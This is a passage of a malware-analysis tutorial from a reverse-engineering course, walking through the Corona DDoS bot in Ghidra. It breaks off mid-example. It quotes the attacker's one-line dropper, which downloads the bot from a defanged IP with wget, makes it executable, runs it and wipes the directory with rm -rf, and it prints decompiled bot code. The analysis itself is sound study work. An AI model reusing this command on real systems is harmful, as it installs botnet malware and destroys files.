<li class="page_item page-item-2764"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/javascript-string-concatenation-deobfuscation/">JavaScript string concatenation deobfuscation</a></li>
<li class="page_item page-item-3061"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/automatic-rezer0-payload-and-configuration-extraction/">Automatic ReZer0 payload and configuration extraction</a></li>
<li class="page_item page-item-3206"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-decrypt-strings-in-amadey-1-09/">Ghidra script to decrypt strings in Amadey 1.09</a></li>
<li class="page_item page-item-3521"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-decrypt-a-string-array-in-xor-ddos/">Ghidra script to decrypt a string array in XOR DDoS</a></li>
<li class="page_item page-item-3974"><a href="https://maxkersten.nl/binary-analysis-course/analysis-scripts/ghidra-script-to-handle-stack-strings/">Ghidra script to handle stack strings</a></li>
	</ul>
</li>
<li class="page_item page-item-3978 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/">Malware snippets<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3982"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/self-deletion/">Self Deletion</a></li>
<li class="page_item page-item-3984"><a href="https://maxkersten.nl/binary-analysis-course/malware-snippets/api-hashing/">API Hashing</a></li>
	</ul>
</li>
<li class="page_item page-item-1250 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/obtaining-samples/">Obtaining samples<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1253"><a href="https://maxkersten.nl/binary-analysis-course/obtaining-samples/searching-samples/">Searching samples</a></li>
	</ul>
</li>
<li class="page_item page-item-2096 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/documentation/">Documentation<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-2099"><a href="https://maxkersten.nl/binary-analysis-course/documentation/article-structure/">Article structure</a></li>
	</ul>
</li>
<li class="page_item page-item-480"><a href="https://maxkersten.nl/binary-analysis-course/resources/">Resources</a></li>
<li class="page_item page-item-473"><a href="https://maxkersten.nl/binary-analysis-course/faq/">FAQ</a></li>
<li class="page_item page-item-1490 menu-item-has-children"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/">Miscellaneous<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-1493"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2018-2019/">A year in review: 2018-2019</a></li>
<li class="page_item page-item-2697"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2019-2020/">A year in review: 2019-2020</a></li>
<li class="page_item page-item-3467"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2020-2021/">A year in review: 2020-2021</a></li>
<li class="page_item page-item-4031"><a href="https://maxkersten.nl/binary-analysis-course/miscellaneous/a-year-in-review-2021-2022/">A year in review: 2021-2022</a></li>
	</ul>
</li>
</ul>
</li>
<li class="page_item page-item-4353"><a href="https://maxkersten.nl/libras-ghidra-library/">Libra&#8217;s Ghidra Library</a></li>
<li class="page_item page-item-161 menu-item-has-children"><a href="https://maxkersten.nl/projects/">Projects<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-793"><a href="https://maxkersten.nl/projects/androidprojectcreator/">AndroidProjectCreator</a></li>
<li class="page_item page-item-3295 menu-item-has-children"><a href="https://maxkersten.nl/projects/m3-framework/">m3 framework<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3292"><a href="https://maxkersten.nl/projects/m3-framework/extending-m3/">Extending m3</a></li>
<li class="page_item page-item-3329"><a href="https://maxkersten.nl/projects/m3-framework/anubis-and-cerberus-explained/">Anubis and Cerberus explained</a></li>
	</ul>
</li>
<li class="page_item page-item-3128 menu-item-has-children"><a href="https://maxkersten.nl/projects/api-client-libraries/">API client libraries<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-3351"><a href="https://maxkersten.nl/projects/api-client-libraries/hatching-triage-java-api-client/">Hatching Triage Java API client</a></li>
<li class="page_item page-item-3353"><a href="https://maxkersten.nl/projects/api-client-libraries/malshare-java-api-client/">MalShare Java API client</a></li>
<li class="page_item page-item-3700"><a href="https://maxkersten.nl/projects/api-client-libraries/malware-bazaar-java-api-client/">Malware Bazaar Java API client</a></li>
<li class="page_item page-item-4185"><a href="https://maxkersten.nl/projects/api-client-libraries/yaraify-java-api-client/">Yaraify Java API client</a></li>
	</ul>
</li>
<li class="page_item page-item-2876"><a href="https://maxkersten.nl/projects/malwaretheflag/">MalwareTheFlag</a></li>
<li class="page_item page-item-2145"><a href="https://maxkersten.nl/projects/responsible-disclosures/">Responsible Disclosures</a></li>
<li class="page_item page-item-2430"><a href="https://maxkersten.nl/projects/malpull/">MalPull</a></li>
<li class="page_item page-item-104 menu-item-has-children"><a href="https://maxkersten.nl/projects/capricorn/">Capricorn<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-109"><a href="https://maxkersten.nl/projects/capricorn/changelog/">Changelog</a></li>
	</ul>
</li>
<li class="page_item page-item-2141 menu-item-has-children"><a href="https://maxkersten.nl/projects/archive/">Archive<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
	<ul class='children'>
<li class="page_item page-item-163"><a href="https://maxkersten.nl/projects/archive/shouldersurfer/">ShoulderSurfer</a></li>
<li class="page_item page-item-167"><a href="https://maxkersten.nl/projects/archive/stringer/">Stringer</a></li>
<li class="page_item page-item-16 menu-item-has-children"><a href="https://maxkersten.nl/projects/archive/gemini/">Gemini<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
		<ul class='children'>
<li class="page_item page-item-73"><a href="https://maxkersten.nl/projects/archive/gemini/changelog/">Changelog</a></li>
		</ul>
</li>
<li class="page_item page-item-35"><a href="https://maxkersten.nl/projects/archive/whitepapers/">Whitepapers</a></li>
	</ul>
</li>
</ul>
</li>
<li class="page_item page-item-4 menu-item-has-children"><a href="https://maxkersten.nl/about-me/">About me<span role="button" class="dropdown-menu-toggle" aria-expanded="false"></span></a>
<ul class='children'>
<li class="page_item page-item-2436"><a href="https://maxkersten.nl/about-me/news-and-conferences/">News and conferences</a></li>
<li class="page_item page-item-198"><a href="https://maxkersten.nl/about-me/privacy-policy/">Privacy Policy</a></li>
</ul>
</li>
		</ul>
	</div><!-- .main-nav -->
			</div><!-- .inside-navigation -->
	</nav><!-- #site-navigation -->
		
	<div id="page" class="hfeed site grid-container container grid-parent">
		<div id="content" class="site-content">
			
	<div id="primary" class="content-area grid-parent mobile-grid-100 grid-75 tablet-grid-75">
		<main id="main" class="site-main">
						
				
<article id="post-1785" class="post-1785 page type-page status-publish" itemtype='http://schema.org/CreativeWork' itemscope='itemscope'>
	<div class="inside-article">
				
					<header class="entry-header">
				<h1 class="entry-title" itemprop="headline">Corona DDoS bot</h1>			</header><!-- .entry-header -->
				
				<div class="entry-content" itemprop="text">
			<p><em>This article was published on the 14th of October 2019. This article was updated on the 19th of March 2020, as well as on the 7th of December 2021.</em></p>
<p>Distributed denial of service (DDoS) attacks can successfully deny the victim&#8217;s access to the internet for a period of time. Compromised servers can be used to launch such an attack. Additionally, the rise of infected <em>smart</em> devices that are connected to the internet, allow criminal actors to grow their botnets to sizes that were not seen before. These smart devices aren&#8217;t updated in time, if updates are released at all.</p>
<p>In this article, the Corona DDoS tool is analysed in the usual step-by-step manner. It contains elements of the BASHLITE family. The used analysis method will mainly focus on a breadth-first top-down approach. Breadth-first means that a function is analysed completely before moving on to functions that are called within the current function. Top-down means that the analysis begins at the start of the program, after which the analysis follows the flow of the program itself.</p>
<h2>Table of contents</h2>
<ul>
<li><a href="#outline">Outline</a></li>
<li><a href="#sample-information">Sample information</a></li>
<li><a href="#obtaining-the-sample">Obtaining the sample</a></li>
<li><a href="#used-tooling">Used tooling</a></li>
<li><a href="#technical-analysis">Technical analysis</a></li>
<li><a href="#analysing-the-main-function">Analysing the main function</a></li>
<li><a href="#determining-the-next-steps">Determining the next steps</a></li>
<li><a href="#obtaining-the-local-address">Obtaining the local address</a></li>
<li><a href="#the-socket-mutex">The socket mutex</a></li>
<li><a href="#string-decryption">String decryption</a></li>
<li><a href="#testing-the-internet-connection">Testing the internet connection</a></li>
<li><a href="#registering-the-bot">Registering the bot</a></li>
<li><a href="#parsing-a-command">Parsing a command</a></li>
<li><a href="#analysing-the-command-handling">Analysing the command handling</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ul>
<p><a name ="outline"></a></p>
<h2><a href="#outline">Outline</a></h2>
<p>In this article, multiple phases will be described using the usual step-by-step approach. Firstly, the main function is analysed in order to get an overview of the malware&#8217;s lay-out. Secondly, the local address is obtained. Thirdly, the mutex that is used by the malware is described. Fourthly, the decryption routine for the encrypted strings will be analysed and rewritten in Java. Using this decryptor, the actual values of the encrypted strings can be obtained. Fifthly, the bot&#8217;s registration at the command &#038; control server will be analysed, including a connectivity check. Sixthly, the process of dispatching incoming commands will be analysed. Lastly, a conclusion is made based upon the findings.</p>
<p><a name ="sample-information"></a></p>
<h2><a href="#sample-information">Sample information</a></h2>
<p>The sample that is analysed in this article can be found based upon the following information.</p>
<pre>
MD5: c2ab26263fa70e28e6d63b4fe4519a93
SHA-1: 2f1194a220b677fbeb66ad6fed606e795abc5fd0
SHA-256: b2aa076b43bb3369b6af3e884896679009dd91222f4c29f28426fdedc46d2bde
Size: 65620 bytes
</pre>
<p>Additionally, one can download it from <a href="https://beta.virusbay.io/sample/browse/c2ab26263fa70e28e6d63b4fe4519a93">VirusBay</a>, <a href="https://bazaar.abuse.ch/sample/b2aa076b43bb3369b6af3e884896679009dd91222f4c29f28426fdedc46d2bde/">Malware Bazaar</a>, or <a href="https://malshare.com/sample.php?action=detail&#038;hash=c2ab26263fa70e28e6d63b4fe4519a93">MalShare</a>.</p>
<p><a name ="obtaining-the-sample"></a></p>
<h2><a href="#obtaining-the-sample">Obtaining the sample</a></h2>
<p>An anonymous source provided the sample, along with the commands that are executed by the malicious actor. The commands are given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="bash"><pre class="de1"><span class="kw2">wget</span> http:<span class="sy0">//</span><span class="nu0">91</span><span class="br0">&#91;</span>.<span class="br0">&#93;</span><span class="nu0">209</span><span class="br0">&#91;</span>.<span class="br0">&#93;</span><span class="nu0">70</span><span class="br0">&#91;</span>.<span class="br0">&#93;</span><span class="nu0">174</span><span class="sy0">/</span>Corona.x86_64; <span class="kw2">chmod</span> <span class="nu0">777</span> <span class="sy0">*</span>; .<span class="sy0">/</span>Corona.x86_64 ROOTS; <span class="kw2">rm</span> <span class="re5">-rf</span> <span class="sy0">*</span>;<span class="br0">&#41;</span></pre></div></div></div></div></div></div></div>


<p>The malware is downloaded from the given URL using <a href="https://www.gnu.org/software/wget/">wget</a>, after which <a href="https://linux.die.net/man/1/chmod">chmod</a> is used to set the <em>Read Write Execute</em> bits of every file in the current directory to <em>true</em>. This makes the downloaded program executable. The program is then started with a single command line argument: <em>ROOTS</em>. All files in the working directory are then forcefully and recursively removed using <a href="https://linux.die.net/man/1/rm">rm</a> using <em>rm -rf</em>.</p>
<p><a name ="used-tooling"></a></p>
<h2><a href="#used-tooling">Used tooling</a></h2>
<p>The analysis of this program is done with <a href="https://ghidra-sre.org/releaseNotes_9.1.html#9_0_2">Ghidra 9.0.2</a>. When loading the ELF binary into Ghidra, all default analysis options are selected as well as the <em>Decompiler Parameter ID</em> option. Further renaming and retyping of variables will be done manually.</p>
<p><a name ="technical-analysis"></a></p>
<h2><a href="#technical-analysis">Technical analysis</a></h2>
<p>This version of the Corona bot contains the original symbols, since the binary was not compiled with the <em>strip</em> flag. The analysis in this article will not rely on the symbols, as they are not always present, nor are they always accurate.</p>
<p>Ghidra&#8217;s decompiler will be used to get an overview of the code, but the assembly instructions will be used to verify the output, especially in cases where the generated pseudo code looks unlikely or incorrect.</p>
<h3>Committing local variables</h3>
<p>When viewing a function in the decompiler, it is helpful to right click somewhere in the decompiler window and select the <em>Commit Locals</em> option. This saves the variables for later usage and is used to optimise the code within the function. Additionally, it renames variables based on the argument names of the functions that are called within the code. Whenever a function is analysed within this article, the local variables are committed.</p>
<p><a name ="analysing-the-main-function"></a></p>
<h2><a href="#analysing-the-main-function">Analysing the main function</a></h2>
<p>The starting point of this binary is found in the <em>main</em> function. In here, the core logic of the program is located. The complete code of the function is given below, after which it is analysed in parts.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> main<span class="br0">&#40;</span>undefined8 uParm1<span class="sy0">,</span><span class="kw4">long</span> lParm2<span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  __pid_t _Var1<span class="sy0">;</span>
  uint uVar2<span class="sy0">;</span>
  time_t tVar3<span class="sy0">;</span>
  undefined2 local_78<span class="sy0">;</span>
  undefined local_76 <span class="br0">&#91;</span><span class="nu0">90</span><span class="br0">&#93;</span><span class="sy0">;</span>
  uint local_1c<span class="sy0">;</span>
&nbsp;
  local_1c <span class="sy0">=</span> local_addr<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  ensure_bind<span class="br0">&#40;</span><span class="br0">&#40;</span>ulong<span class="br0">&#41;</span>local_1c<span class="br0">&#41;</span><span class="sy0">;</span>
  signal<span class="br0">&#40;</span><span class="nu12">0x11</span><span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span><span class="nu12">0x1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  signal<span class="br0">&#40;</span><span class="nu0">1</span><span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span><span class="nu12">0x1</span><span class="br0">&#41;</span><span class="sy0">;</span>
  _Var1 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>_Var1 <span class="sy0">&lt;</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    encryption_init<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#40;</span><span class="kw4">long</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo <span class="sy0">+</span> <span class="nu0">100</span><span class="sy0">,</span>enc_unknown<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    <span class="kw1">else</span> <span class="br0">&#123;</span>
      <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo <span class="sy0">+</span> <span class="nu0">100</span><span class="sy0">,*</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">**</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    local_78 <span class="sy0">=</span> <span class="nu12">0x20</span><span class="sy0">;</span>
    <span class="kw3">memset</span><span class="br0">&#40;</span>local_76<span class="sy0">,</span><span class="nu0">0</span><span class="sy0">,</span><span class="nu12">0x4e</span><span class="br0">&#41;</span><span class="sy0">;</span>
    prctl<span class="br0">&#40;</span><span class="nu12">0xf</span><span class="sy0">,&amp;</span>local_78<span class="br0">&#41;</span><span class="sy0">;</span>
    tVar3 <span class="sy0">=</span> <span class="kw3">time</span><span class="br0">&#40;</span><span class="br0">&#40;</span>time_t <span class="sy0">*</span><span class="br0">&#41;</span><span class="nu12">0x0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    uVar2 <span class="sy0">=</span> getpid<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    srandom<span class="br0">&#40;</span>uVar2 <span class="sy0">^</span> <span class="br0">&#40;</span>uint<span class="br0">&#41;</span>tVar3<span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">do</span> <span class="br0">&#123;</span>
      connection<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
      recv_buf<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>After the declaration of the variables, the <em>local_addr</em> function is called, which returns a numeric value. Based on the function name, this function is likely to return the local address of the machine. Based on which <em>local_1c</em> can be renamed to <em>localAddr</em>. This value is then used as an argument in the <em>ensure_bind</em> function, which is likely to ensure that a binding of sorts is present.</p>
<p>The two <em>signal</em> function calls after that set the way that signals are handled. The <em>signal</em> function has the following function signature:</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> <span class="br0">&#40;</span> <span class="sy0">*</span>signal<span class="br0">&#40;</span><span class="kw4">int</span> signum<span class="sy0">,</span> <span class="kw4">void</span> <span class="br0">&#40;</span><span class="sy0">*</span>handler<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span><span class="br0">&#41;</span> <span class="br0">&#41;</span> <span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The first argument (named <em>signum</em>) is the specific value of the signal. The second argument is used to determine what needs to be done with the signal that is specified in the first argument.</p>
<p>In the <em>main</em> function&#8217;s <em>signal</em> functions, the <em>signum</em> parameter equals <em>0x11</em> (or <em>17</em> in decimal) and <em>1</em>. According to the x86_64 Linux <a href="https://github.com/torvalds/linux/blob/master/arch/ia64/include/uapi/asm/signal.h">signal.h source code</a>, these values are equal to <em>SIGCHLD</em> and <em>SIGHUP</em> respectively. </p>
<p>The <em>SIGCHLD</em> (<em>SIG CHILD</em>) signal is sent to a process when a child process ends. The existence of a child process is logical, since the <em>fork</em> function is called later on in the <em>main</em> function.</p>
<p>The <em>SIGHUP</em> (<em>SIG HANGUP</em>) signal is sent to a process when the terminal that controls the process, is closed.</p>
<p>The second parameter, equal to <em>0x01</em> in both cases, equals <em>SIG_IGN</em> (<em>SIG IGNORE</em>), as can be seen in the Linux <a href="http://man7.org/linux/man-pages/man7/signal.7.html">man pages</a>. This means that the specified signals are effectively ignored, leaving the process running when it&#8217;s controlling terminal is closed or when a child process ends.</p>
<p>In Ghidra&#8217;s disassembler view, one can right click on a value and select <em>Set Equate</em>. Alternatively, one can press <em>E</em>. This allows Ghidra to display a custom string, instead of a constant value. In this case, the enum values can be used to redefine the constant integer values that are given in the disassembly. This increases the readability of the code a lot. The change is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
signal<span class="br0">&#40;</span><span class="nu12">0x11</span><span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span><span class="nu12">0x1</span><span class="br0">&#41;</span><span class="sy0">;</span>
signal<span class="br0">&#40;</span><span class="nu0">1</span><span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span><span class="nu12">0x1</span><span class="br0">&#41;</span><span class="sy0">;</span>
&nbsp;
<span class="co1">//After</span>
signal<span class="br0">&#40;</span>SIGCHLD<span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span>SIG_IGN<span class="br0">&#41;</span><span class="sy0">;</span>
signal<span class="br0">&#40;</span>SIGHUP<span class="sy0">,</span><span class="br0">&#40;</span>__sighandler_t<span class="br0">&#41;</span>SIG_IGN<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The next part of the function creates a child process. The return value of the <em>fork</em> function needs to be less than 1 in order for the execution to continue.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">  _Var1 <span class="sy0">=</span> fork<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>_Var1 <span class="sy0">&lt;</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="co1">//Continue execution</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The <a href="http://man7.org/linux/man-pages/man2/fork.2.html">Linux manual pages</a> provide information about the possible return values, as can be seen below.</p>
<pre>
On success, the PID of the child process is returned in the parent,
and 0 is returned in the child.  On failure, -1 is returned in the
parent, no child process is created, and errno is set appropriately.
</pre>
<p>Based on this, one can conclude that the code within the if-statement is executed by the child process. If the creation of the child process fails, the parent will execute the body of the if-statement.</p>
<p>To increase the readability of the code, <em>_Var1</em> can be renamed into <em>forkResult</em>. One can do this by using the context menu when right clicking on the variable in the decompiler and selecting <em>Rename Variable</em>. Alternatively, one can press <em>L</em> when the variable is selected.</p>
<p>The body of the if-statement contains a call to the <em>encryption_init</em> function, which does not return a value. After that, yet another if-statement is present, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">encryption_init<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#40;</span><span class="kw4">long</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo <span class="sy0">+</span> <span class="nu0">100</span><span class="sy0">,</span>enc_unknown<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">else</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo <span class="sy0">+</span> <span class="nu0">100</span><span class="sy0">,*</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">**</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The variable that is located at <em>lParm2 + 8</em> is compared to the value <em>0</em>. Within the if-statement, the value is treated as <em>(*(long *)</em>, whilst the declared type equals <em>long</em>. Within the body of the if-statement, the variable is treated as a <em>*(char **)</em>.</p>
<p>At first, the value that is located at the address that <em>lParm2 + 8</em> points to, is compared to <em>NULL</em>. If this is the case, a string named <em>enc_unknown</em> is copied into <em>myinfo + 100</em>. If the comparison is not equal, the value that resides at <em>lParm2 + 8</em> is copied into <em>myinfo + 100</em>.</p>
<p>In the x86_64 architecture, the size of an integer equals 8 bytes. The second parameter of the main function is a string array which contains the command line arguments. At index <em>0</em>, a pointer towards the program itself is present. At index <em>1</em>, a pointer to the first command line argument is given. </p>
<p>In this case, the first check verifies the presence of a command line argument. If it is present, the value is copied into <em>myinfo + 100</em>. If not, the value of <em>enc_unknown</em> is copied.</p>
<h3>Creating a custom structure</h3>
<p>The global variable <em>myinfo</em> is 300 bytes in size. When using selecting  <em>myinfo</em> in the disassembler by double clicking, one can use <em>CTRL + SHIFT + F</em> to find cross references. As a result, multiple cross references are shown, where only two locations are accessed: <em>myinfo + 100</em> and <em>myinfo + 200</em>. To clarify the code even further, one can change the type of <em>myinfo</em> to a custom struct that contains 3 arrays of 100 characters each.</p>
<p>One can create a custom struct in the Data Type Manager, which is located in the bottom left corner by default. In here, all used data types are found. The binary&#8217;s name is also included in this list, which is where this custom struct will be added, as the struct only occurs within this binary. Right clicking on the entry with the binary&#8217; s name shows a context menu with multiple options. Select <em>New -> Structure</em>. </p>
<p>In the bottom part of the screen that pops up, one can give the structure a name. In this case, the given name equals <em>myinfo_struct</em>. The green plus at the top is used to add a field to the struct. Next up, double click the on the text box in the <em>DataType</em> column. Here, the type of the field is to be defined. In this case, a character array will be used. The length of the array, in all three cases, is 100 characters: <em>char[100]</em>. </p>
<p>After defining the fields, they remain nameless. The first field has no references according to the cross references, thus the name is irrelevant. The name that is used in this article is <em>unknown_1</em>. The second field contains the command line argument, which can thus be named <em>command_line_argument</em>. Lastly, the third field needs a name. As the content of this field is not yet known, the name <em>unknown_2</em> is assigned until more information is known.</p>
<p>The floppy symbol saves the custom struct, after which the structure editor can be closed. To use the newly created structure, one needs to navigate to <em>myinfo</em> in the disassembler, select it and press <em>T</em>. Alternatively, one can use the context menu of the right mouse button and select <em>Data ->  Select Data Type</em>. Search for <em>myinfo_struct</em> and select the type. The decompiled code should then automatically change, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#40;</span><span class="kw4">long</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo <span class="sy0">+</span> <span class="nu0">100</span><span class="sy0">,</span>enc_unknown<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">else</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo <span class="sy0">+</span> <span class="nu0">100</span><span class="sy0">,*</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">**</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="co1">//After</span>
<span class="kw1">if</span> <span class="br0">&#40;</span><span class="sy0">*</span><span class="br0">&#40;</span><span class="kw4">long</span> <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,</span>enc_unknown<span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="kw1">else</span> <span class="br0">&#123;</span>
  <span class="kw3">strcpy</span><span class="br0">&#40;</span>myinfo.<span class="me1">command_line_argument</span><span class="sy0">,*</span><span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">**</span><span class="br0">&#41;</span><span class="br0">&#40;</span>lParm2 <span class="sy0">+</span> <span class="nu0">8</span><span class="br0">&#41;</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>This makes the code much more readable and removes the mental note that <em>myinfo + 100</em> contains the command line argument. Note that <em>lParm2</em> can be renamed to <em>argv</em>. To further increase the readability of the code, one can retype <em>argv</em> into a <em>char**</em>. The decompiler will then correctly display the variable as an array, as can be seen below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="co1">//Before</span>
